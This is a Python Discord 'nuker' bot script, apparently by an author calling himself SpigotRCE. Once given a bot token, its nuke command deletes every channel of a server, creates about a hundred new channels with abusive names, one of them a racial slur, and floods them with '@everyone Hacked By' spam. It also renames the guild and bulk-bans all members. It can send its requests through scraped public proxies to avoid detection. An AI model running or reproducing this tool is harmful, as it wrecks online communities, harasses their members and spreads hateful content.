import re
import socket
from os import system
try:
    import requests
    import time
    import threading
    import random
    import discord
    import colorama
    from discord.ext import commands
    from discord import LoginFailure

except ModuleNotFoundError:
    print("Required modules not found, installing...")
    system("python -m pip install requests~=2.32.3")
    system("python3 -m pip install requests~=2.32.3")
    system("python -m pip install discord~=2.3.2")
    system("python3 -m pip install discord~=2.3.2")
    system("python -m pip install colorama~=0.4.6")
    system("python3 -m pip install colorama~=0.4.6")
    input("Press enter to restart...")


colorama.init(autoreset=True)


def interpolate_color(color_start, color_end, blend_factor):
    return (
        int(color_start[0] + (color_end[0] - color_start[0]) * blend_factor),
        int(color_start[1] + (color_end[1] - color_start[1]) * blend_factor),
        int(color_start[2] + (color_end[2] - color_start[2]) * blend_factor)
    )


def print_logo():
    system("cls || clear")
    logo = """
    \000
     _____                       _   _       _             
    /  ___|                     | \\ | |     | |            
    \\ `--.  __ _ _ __  _ __ __ _|  \\| |_   _| | _____ _ __ 
     `--. \\/ _` | '_ \\| '__/ _` | . ` | | | | |/ / _ \\ '__|
    /\\__/ / (_| | |_) | | | (_| | |\\  | |_| |   <  __/ |   
    \\____/ \\__,_| .__/|_|  \\__,_\\_| \\_/\\__,_|_|\\_\\___|_|   
                | |                                        
                |_|                                        
    
                      SpigotRCE#0
    \000
    """

    start_color = (0, 0, 255)
    middle_color = (128, 0, 128)
    end_color = (255, 105, 180)
    logo_lines = logo.strip().split("\n")
    total_lines = len(logo_lines)
    half_count = total_lines // 2
    for i, l in enumerate(logo_lines):
        if i < half_count:
            blend_factor = i / half_count
            r, g, b = interpolate_color(start_color, middle_color, blend_factor)
        else:
            blend_factor = (i - half_count) / (total_lines - half_count)
            r, g, b = interpolate_color(middle_color, end_color, blend_factor)
        print(f'\033[38;2;{r};{g};{b}m' + l)

print_logo()
# All parameters
LINK = 'https://YouTube.com/@SpigotRCE https://discord.gg/3meyfSZ37J'
MESSAGES = [
    '@everyone Hacked By ' + LINK,
    '@everyone Fucked By ' + LINK,
    '@everyone Owned By ' + LINK,
    '@everyone Nuked By ' + LINK
]
CHANNEL_NAMES = [
    'Hacked',
    'Fucked',
    'Nuked',
    'Nigger'
]

GUILD = 0
TOKEN = input("Enter token: ")
USE_PROXY = True if input("Use proxy Y/n (Not recommended)") in ["y", "yes", "Y", "Yes", "YES"] else False
print("Using proxies" if USE_PROXY else "")
headers = {'authorization': f'Bot {TOKEN}'}


def get_all_channels():
    while True:
        r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD}/channels", headers=headers, proxies=get_proxy(), verify=False)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code in [200, 201, 204]:
                return r.json()
            else:
                return


def get_all_roles():
    roles = []
    response = requests.get(f'https://discord.com/api/v10/guilds/{GUILD}/roles', headers=headers, verify=False)
    if response.status_code == 200:
        roles_data = response.json()
        roles.extend(roles_data)
    elif response.status_code == 429:
        time.sleep(int(response.headers.get('Retry-After', 1)))
    else:
        print(f"Failed to fetch roles. Status code: {response.status_code}")
        return None

    return roles


def remove_channel(_id):
    while True:
        r = requests.delete(f"https://discord.com/api/v10/channels/{_id}", headers=headers, proxies=get_proxy(), verify=False)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code in [200, 201, 204]:
                # print(f"[Success] Removed channel: {_id}")
                return


def channel(name):
    while True:
        json = {'name': f"{name}-{str(random.randrange(1, 987987987))}", 'type': 0}
        r = requests.post(f'https://discord.com/api/v10/guilds/{GUILD}/channels', headers=headers, json=json,
                          proxies=get_proxy(), verify=False)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                _id = r.json()["id"]
                # print(f"[Success] Created channel: {id}")
                threading.Thread(target=send_message, args=(_id,)).start()
                return
            else:
                continue


def send_message(_id):
    while True:
        json = {'content': random.choice(MESSAGES)}
        r = requests.post(f'https://discord.com/api/v10/channels/{_id}/messages', headers=headers, json=json,
                          proxies=get_proxy(), verify=False)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])


def kick_member(_id):
    while True:
        url = f'https://discord.com/api/v10/guilds/{GUILD}/members/{_id}'
        response = requests.delete(url, headers=headers, proxies=get_proxy(), verify=False)

        if response.status_code == 204:
            # print(f"Successfully kicked member: {id}")
            return


def remove_channels(channel_ids):
    for channel_id in channel_ids:
        threading.Thread(target=remove_channel, args=(channel_id,)).start()


async def remove_members():
    time.sleep(2)
    guild = BOT.get_guild(GUILD)
    if guild:
        members_to_ban = [member for member in guild.members]
        try:
            result = await guild.bulk_ban(
                members_to_ban,
                reason=random.choice(MESSAGES),
                delete_message_seconds=86400
            )
            if result.failed:
                print(f"Failed to ban {len(result.failed)} users.")
        except discord.Forbidden:
            print("I do not have permission to ban users.")
        except discord.HTTPException as e:
            print(f"An error occurred: {e}")


PROXIES = []


def get_proxy():
    if not USE_PROXY:
        return None
    PROXY = random.choice(PROXIES)
    return {"https": PROXY}


BOT = commands.Bot(command_prefix='!', intents=discord.Intents.all(), help_command=None)


@BOT.event
async def on_ready():
    await BOT.change_presence(status=discord.Status.idle, activity=discord.Game(name='Looking for a cup of coffee'))
    print("Bot loaded!")
    print("Bot is in " + str(len(BOT.guilds)) + " server.")
    for guild in BOT.guilds:
        print(guild.name + " (" + str(guild.id) + ") owner: " + guild.owner.name + " (" + str(guild.owner.id) + ") ")


def nuke_():
    channel_ids = [c['id'] for c in get_all_channels()]
    if len(channel_ids) != 0:
        remove_channels(channel_ids)
    else:
        print("No channels found.")
    for _ in range(100):
        threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()


@BOT.command()
async def nuke(ctx):
    global GUILD
    GUILD = ctx.guild.id
    await ctx.message.delete()
    threading.Thread(target=nuke_, ).start()
    await ctx.guild.edit(name=f"#SPIGOTRCE ON TOP {random.randrange(1, 987987987)}")
    await remove_members()


@BOT.event
async def on_guild_channel_create(_channel):
    print(f"Channel created {_channel.id}")


@BOT.event
async def on_guild_channel_delete(_channel):
    print(f"Channel deleted {_channel.name}")


@BOT.event
async def on_member_remove(member):
    print(f"Kicked {member.name}")


urls = """https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"""

proxies = []
good_proxies = list()


def pattern_one(url):
    ip_port = re.findall('(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3}:\d{2,5})', url)
    if not ip_port:
        pattern_two(url)
    else:
        for i in ip_port:
            proxies.append(str(i))
            good_proxies.append(i)


def pattern_two(url):
    ip = re.findall('>(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})<', url)
    port = re.findall('td>(\d{2,5})<', url)
    if not ip or not port:
        pattern_three(url)
    else:
        for i in range(len(ip)):
            proxies.append(str(ip[i]) + ':' + str(port[i]))
            good_proxies.append(str(ip[i]) + ':' + str(port[i]))


def pattern_three(url):
    ip = re.findall('>\n\s+(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})', url)
    port = re.findall('>\n\s+(\d{2,5})\n', url)
    if not ip or not port:
        pattern_four(url)
    else:
        for i in range(len(ip)):
            proxies.append(str(ip[i]) + ':' + str(port[i]))
            good_proxies.append(str(ip[i]) + ':' + str(port[i]))


def pattern_four(url):
    ip = re.findall('>(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})<', url)
    port = re.findall('>(\d{2,5})<', url)
    if not ip or not port:
        pattern_five(url)
    else:
        for i in range(len(ip)):
            proxies.append(str(ip[i]) + ':' + str(port[i]))
            good_proxies.append(str(ip[i]) + ':' + str(port[i]))


def pattern_five(url):
    ip = re.findall('(\d{,3}\.\d{,3}\.\d{,3}\.\d{,3})', url)
    port = re.findall('(\d{2,5})', url)
    for i in range(len(ip)):
        proxies.append(str(ip[i]) + ':' + str(port[i]))
        good_proxies.append(str(ip[i]) + ':' + str(port[i]))


def start(url):
    try:
        req = requests.get(url, headers={
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'}).text
        pattern_one(req)
        print(f' [+] Scrapping from: {url}')
    except requests.exceptions.SSLError:
        print(str(url) + ' [x] SSL Error')
        return
    print(str(url) + ' [x] Random Error')

def check_proxy(proxy, online_proxies, offline_proxies):
    try:
        proxy_ip, proxy_port = proxy.split(':')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)  # Adjust the timeout as needed
        s.connect((proxy_ip, int(proxy_port)))
        print(f"Proxy {proxy} is online.")
        online_proxies.append(proxy)
        s.close()
    except:
        offline_proxies.append(proxy)

def fetch_proxies():
    global PROXIES
    threads = list()
    for url in urls.splitlines():
        if url:
            x = threading.Thread(target=start, args=(url,))
            x.start()
            threads.append(x)

    for th in threads:
        th.join()
    print(f' \n\n[/] Total scraped proxies: ({len(good_proxies)})')

    online_proxies = []
    offline_proxies = []

    threads = []

    for proxy in good_proxies:
        t = threading.Thread(target=check_proxy, args=(proxy, online_proxies, offline_proxies))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print(f' \n\n[/] Total online proxies: ({len(online_proxies)})')
    PROXIES = online_proxies

if USE_PROXY:
    fetch_proxies()

try:
    BOT.run(TOKEN)
except LoginFailure:
    print("Invalid token has been passed!")
    exit()
